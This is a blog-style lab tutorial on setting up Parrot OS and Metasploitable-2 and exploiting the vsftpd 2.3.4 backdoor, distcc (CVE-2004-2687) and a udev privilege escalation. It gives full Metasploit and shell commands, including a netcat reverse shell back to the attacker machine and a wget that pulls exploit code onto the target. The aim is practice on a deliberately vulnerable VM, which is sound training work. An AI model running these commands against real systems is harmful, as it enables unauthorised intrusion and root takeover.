---
title: Basic Penetration testing lab — 1
description: >-
  I am setting up a new lab for me and thought to document the process, so
  anyone wants to do the same can take references from this post. I…
date: '2018-09-16T17:29:15.154Z'
categories: []
keywords: []
slug: /@ehsahil/basic-penetration-testing-lab-1-7544969cb3ac
---

I am setting up a new lab for me and thought to document the process, so anyone wants to do the same can take references from this post. I am writing this one from scratch and I will also add more parts as I move forward.

#### Preface

1.  Downloading all the things.
2.  Creating Virtual machines
3.  Configuring Virtual machines
4.  Reconnaissance
5.  Exploiting Common vulnerabilities — Metasploitable-2
6.  Credits

### 1\. Downloading all the Things.

**Vmware Fusion 10 **— I like the paid version of the Vmware fusion 10 but you guys also use the Virtual box, which is FREE but I highly recommend Vmware fusion 10.

[**Download VMware Fusion 10**  
_Download VMware Fusion 10 and let your Mac run Windows, Linux or Mac OS X Server. Run the most demanding Mac and…_my.vmware.com](https://my.vmware.com/en/web/vmware/info/slug/desktop_end_user_computing/vmware_fusion/10_0 "https://my.vmware.com/en/web/vmware/info/slug/desktop_end_user_computing/vmware_fusion/10_0")[](https://my.vmware.com/en/web/vmware/info/slug/desktop_end_user_computing/vmware_fusion/10_0)

[**Oracle VM VirtualBox**  
_VirtualBox is being actively developed with frequent releases and has an ever growing list of features, supported guest…_www.virtualbox.org](https://www.virtualbox.org/ "https://www.virtualbox.org/")[](https://www.virtualbox.org/)

**Parrot OS **— I am using Kali Linux for a long time, I wanted to try parrot OS because it was recommended by many.

[**The best choice for security experts, developers and crypto-addicted people.**  
_Discover our awesome cyber security GNU/Linux environment. It includes a full portable laboratory for security and…_www.parrotsec.org](https://www.parrotsec.org/ "https://www.parrotsec.org/")[](https://www.parrotsec.org/)

[https://metasploit.help.rapid7.com/docs/metasploitable-2](https://metasploit.help.rapid7.com/docs/metasploitable-2)

**Metasploitable-2** — Metasploitable-2 is vulnerable by birth, it is developed by the rapid7 for practicing on the vulnerable host. DO NOT expose this machine on any prod or sensitive server.

### 2\. Creating Virtual Machines.

#### **Parrot OS**

Click on the “Install from disc or image” and locate your ISO and Provide default configs, you can choose the memory and size according to your need.

![](https://cdn-images-1.medium.com/max/800/1*tyOSUDpGj5TPwU2jljQueg.png)

Provide the location of the Parrot OS.

![](https://cdn-images-1.medium.com/max/800/1*uenJvdEdmpqh-ZHK_fDW9w.png)
![](https://cdn-images-1.medium.com/max/800/1*Tqvy5QhDrSl8AX15SioUeA.png)

You can use “live mode” or install. I preferred the Installed version.

![](https://cdn-images-1.medium.com/max/800/1*V0ZKXUxRH8xNaPZGH2pKCA.png)

#### Metasploitable-2

The installation process is similar to the ParrotOS.

![](https://cdn-images-1.medium.com/max/800/1*tyOSUDpGj5TPwU2jljQueg.png)

You can provide the memory and size according to your need but keep in mind. You should keep the host machine in mind during providing custom memory and size.

![](https://cdn-images-1.medium.com/max/800/1*LD-sVmOPZ4AjcGy35mz7gA.png)

### **3\. Configuring Virtual Machines**

For setting up a penetration testing lab it is important to make the connection between the machines locally. For doing that you have to use the “**Bridge Connection**” in the network settings.

**ParrotOS**

![You can use according to your requirements.](https://cdn-images-1.medium.com/max/800/1*kHjsTL77Q8z8TrnOhA6tUQ.png)
You can use according to your requirements.![](https://cdn-images-1.medium.com/max/800/1*Ts2H_HsVaiFe_9mlAjtk0A.png)

**Metasploitable-2**

![](https://cdn-images-1.medium.com/max/800/1*Od9fX9B_aKgylJz1AA8-vQ.png)
![](https://cdn-images-1.medium.com/max/800/1*ho8SdQP9_-t64GS4NeIUaA.png)

### **4\. Reconnaissance**

Startup both machines ParrotOS & Metasploitable-2.

#### **Metasploitable-2**

Login with the following credentials.

Username: **msfadmin**  
Password: **msfadmin**

Local IP address for Metasploitable-2 using

**ifconfig**

![](https://cdn-images-1.medium.com/max/800/1*VIX1LTccxwtO4nSjKandng.png)

Metasploitable-2 local IP: 192.168.10.10

#### ParrotOS

Login with your credentials.

default credentials for parrotOS

Username: **user**

Password : **toor**

Find the IP address for ParrotOS using the following command.

**ifconfig**

![](https://cdn-images-1.medium.com/max/800/1*-taCxgq2ti8JwoQ63qIRjA.png)

ParrotOS : local IP **192.168.10.5**

**Port scanning** Metasploitable-2 **using ParrotOS**

**nmap -A 192.168.10.10 -oX /home/ehsahil/Desktop/metaspliot2-nmap-scan.xml**

![](https://cdn-images-1.medium.com/max/800/1*K8c35Z8ZU48fu7cbGfF5Jg.png)

the output is in XML format, let's convert it in the more organized way.

for doing this we will use a utility known as “**xsltproc**” — which will convert the XML into the html.

**xsltproc /home/ehsahil/Desktop/metasploit2-nmap-scan.xml -o /home/ehsahil/Desktop/metasploit2-nmap-scan.xml**

![](https://cdn-images-1.medium.com/max/800/1*sdiPsIksyje5wrxT6meorQ.png)
![](https://cdn-images-1.medium.com/max/800/1*ZF1AjaXFbTGS-6x63hvTJQ.png)

### 5\. Exploiting Common Vulnerabilities.

**Metasploitable — 2**

#### 1\. Exploiting vsftpd 2.3.4

#### 2\. Exploiting Distcc V1 — [CVE-2004–2687](http://cvedetails.com/cve/cve-2004-2687)

#### 1\. Exploiting vsftpd 2.3.4.

**Aim**: Exploit VSFTPD daemon and obtain root access.

Scanning port 21 using nmap.

**nmap -sV -p 21 192.168.10.10**

![](https://cdn-images-1.medium.com/max/800/1*Of0PxfY9pvE4lPOyeAFDjQ.png)

port 21 is open and using **vsftpd version 2.3.4**.

Searching online for the publicly available exploit for this particular version.

**vsftp 2.3.4 exploits**

#### Exploiting manually.

**ftp 192.168.10.10**

**username: — ehsahil:)  
Password — Nothing just enter**

PS: smiley emoji **:)** is important at the end, :) it will be used to trigger the backdoor.

![](https://cdn-images-1.medium.com/max/800/1*qrgde171Hc6T7nlim43vRA.png)

now, we need to listen to port 6200 because backdoor opened the port 6200

**nc -vvn 192.168.10.10 6200**

![](https://cdn-images-1.medium.com/max/800/1*rAvIE8pUO8BPMewKrvZzIg.png)

#### Exploiting Using Metasploitable-2.

Start Metasploitable-2 by using the msfconsole command.

**msfconsole**

![](https://cdn-images-1.medium.com/max/800/1*7tL7qP4ZT-SYwmXY9BSOZw.png)

Metasploit Commands.

**search vsftpd**

**use exploit/Unix/ftp/vsftpd\_234\_backdoor**

**show options**

**set RHOST 192.168.10.10**

**exploit**

![](https://cdn-images-1.medium.com/max/800/1*1iUcAFYC7pXzRc5JSY5vyg.png)
![](https://cdn-images-1.medium.com/max/800/1*wfO2xrIQn1n3z5f4lGDyRA.png)

**Background:** This specific version of the vsftpd was infected with a backdoor by an intruder, the developers quickly responded by deleting the backdoor from the code. the users who upgraded to this version were vulnerable to the issue.

the backdoor is initiated when someone adds **:)** (smiley face) in the username during ftp handshake. then backdoor sets up a bind shell listener on port **6200.**

Vulnerable Source code: [http://pastebin.com/AetT9sS5](http://pastebin.com/AetT9sS5)

Detailed Source code review:

[**Exploiting VSFTPD v2.3.4 on Metasploitable 2 - Hacking Tutorials**  
_In the upcoming Metasploitable 2 exploitation tutorials we will be exploiting the vulnerabilities we have found in the…_www.hackingtutorials.org](https://www.hackingtutorials.org/metasploit-tutorials/exploiting-vsftpd-metasploitable/ "https://www.hackingtutorials.org/metasploit-tutorials/exploiting-vsftpd-metasploitable/")[](https://www.hackingtutorials.org/metasploit-tutorials/exploiting-vsftpd-metasploitable/)

#### 2\. Exploiting Vulnerable DISTCC — [CVE-2004–2687](http://cvedetails.com/cve/cve-2004-2687)

**Aim:** Getting root access on the machine.

DISTCC V1 is known vulnerable application running on Metasploitable-2 but it is interesting because we have to escalate normal user to **root** using “Privilege Escalation”

#### **Searching about distcc on online**

distcc is a tool for speeding up the compilation of source code by using distributed computing over a computer network. With the right configuration, distcc can dramatically reduce a project’s compilation time.

distcc running on port 3632

#### **Running nmap against port — 3632**

**nmap -sV -p 3632 192.168.10.10**

![](https://cdn-images-1.medium.com/max/800/1*JH6v3xVGIPEddndRbu0MTQ.png)

#### Searching for the public exploit for distccd v1

Vulnerable to: [CVE-2004–2687](http://cvedetails.com/cve/cve-2004-2687)

Exploit publicly available. [https://www.rapid7.com/db/modules/exploit/unix/misc/distcc\_exec](https://www.rapid7.com/db/modules/exploit/unix/misc/distcc_exec)

#### Exploiting using Metasploit

**msfconsole**

![](https://cdn-images-1.medium.com/max/800/1*7tL7qP4ZT-SYwmXY9BSOZw.png)
![](https://cdn-images-1.medium.com/max/800/1*y7-Q94SF0pbSax2mYU4v0g.png)

metasploit commands.

**search distcc**

**use exploit/unix/distcc\_exec**

**show options**

**set RHOST 192.168.10.10**

**exploit**

![](https://cdn-images-1.medium.com/max/800/1*POWHzHbLlh76h-X9PVX-bA.png)

Currently, **uid=1** and we cannot **cat /etc/shadow** , This indicated that we don't have root privileges yet.

We need to leverage another vulnerability available in the installed components

for doing that we need to apply recon process to know more about the system.

**Seeing all the shells available to us.**

**cat /etc/shells**

![](https://cdn-images-1.medium.com/max/800/1*g-HUODSc8OhKrmgKuNjkqA.png)

**GCC — Used for compiling exploits**

**which gcc**

![](https://cdn-images-1.medium.com/max/800/1*5SSdzIfMZppT9YbM7QDYgA.png)

**WGET — Used to download the exploit in the vulnerable machine**

**which wget**

![](https://cdn-images-1.medium.com/max/800/1*0ByHLRuagNwAE3qCu4sO7A.png)

lets, see all the running processes.

**ps aux**

![](https://cdn-images-1.medium.com/max/800/1*iS0vOeECv2rmjZj958t33g.png)

from the above processes, we can move forward to see publicly available exploits.

but, as we are using Metasploitable-2, we already know the vulnerable component, we will use that.

The vulnerable component is “**udev**”, let's grep for it from the running processes.

![](https://cdn-images-1.medium.com/max/800/1*QTmbzx0YWnVbDkeiHBQK5w.png)

Searching for exploits on **searchsploit**

**searchsploit udev**

![](https://cdn-images-1.medium.com/max/800/1*pB6PTE-1qlr6WAI-orRsxA.png)

We are interested in the exploit for “local privilege Escalation(2) — /exploits/linux/local/8572.c”

**cat /usr/share/exploitdb/exploits/linux/local/8572.c**

Exploit usage.

![](https://cdn-images-1.medium.com/max/800/1*2aWCx6wvUu36RcrjN1dRSg.png)

**Steps for escalating daemon to root.**

1.  Starting local Apache server — apache2

**service apache2 start**

![](https://cdn-images-1.medium.com/max/800/1*0QFy6Z9tLcfGIgzIG8UlYw.png)

2\. Coping the exploit into the apache server public directory

Exploit directory — /usr/share/exploitdb/exploits/linux/local/

Apache servers public directory: /var/www/html

**sudo /usr/share/exploitdb/exploits/linux/local/8572.c /var/www/html/ehsahil.c**

![](https://cdn-images-1.medium.com/max/800/1*9tJt9cfsIiOGuL5hYd45gg.png)

3\. Copying the exploit file into the vulnerable machine using wget.

**ParrotOS IP: 192.168.10.5**

**wget 192.168.10.5/ehsahil.c**

![](https://cdn-images-1.medium.com/max/800/1*6437GUmATZsYh_JTFCKDLg.png)

our exploit code “ehsahil.c” has been copied to /tmp directory.

4\. Creating a run file in /tmp directory — required by exploit

  
**touch run #creating run file required by the exploit**

**#bash script to get the reverse shell.   
echo '#!/bin/sh' > run   
echo '/bin/netcat -e /bin/bash 192.168.10.5 5555' >> run** 

![](https://cdn-images-1.medium.com/max/800/1*-ao3kWuYqG65en53xCUo9A.png)

5\. Compiling our exploit code.

**gcc ehsahil.c -o ehsahil**

![](https://cdn-images-1.medium.com/max/800/1*8Qs9R5MXSIq_H-L2CQUXLQ.png)

6\. listening on post 5555

**nc -lvnp 5555**

![](https://cdn-images-1.medium.com/max/800/1*clXSRX1L8wHiV4RzdCddWA.png)

7\. PID of the udev Netlink socket

**cat /proc/net/netlink**

![](https://cdn-images-1.medium.com/max/800/1*cGdctJb714h0xMgXfn5UzQ.png)

PID of the udev Netlink socket = **2718**

8\. Executable permission to Compiled Exploit.

**chmod 755 ehsahil**

9\. Exploit.

./ehsahil <Netlink-Socket-address>

**./ehsahil 2718**

Reverse shell obtained.

![](https://cdn-images-1.medium.com/max/800/1*NXrCXP_SBQoWBZqyUHJ_yg.png)

I will post more metasploitable2 common exploits as I practice them.

### Credits

**RWB NetSec**

[**rwbnetsec**  
_Hello! My goal for this channel is to publish video tutorials related to penetration testing. The videos will be geared…_www.youtube.com](https://www.youtube.com/channel/UCAJ8Clc3188ek9T_5XTVzZQ?pbjreload=10 "https://www.youtube.com/channel/UCAJ8Clc3188ek9T_5XTVzZQ?pbjreload=10")[](https://www.youtube.com/channel/UCAJ8Clc3188ek9T_5XTVzZQ?pbjreload=10)

Feedback? hit me on twitter @[ehsahil](https://twitter.com/ehsahil)

Until Next time.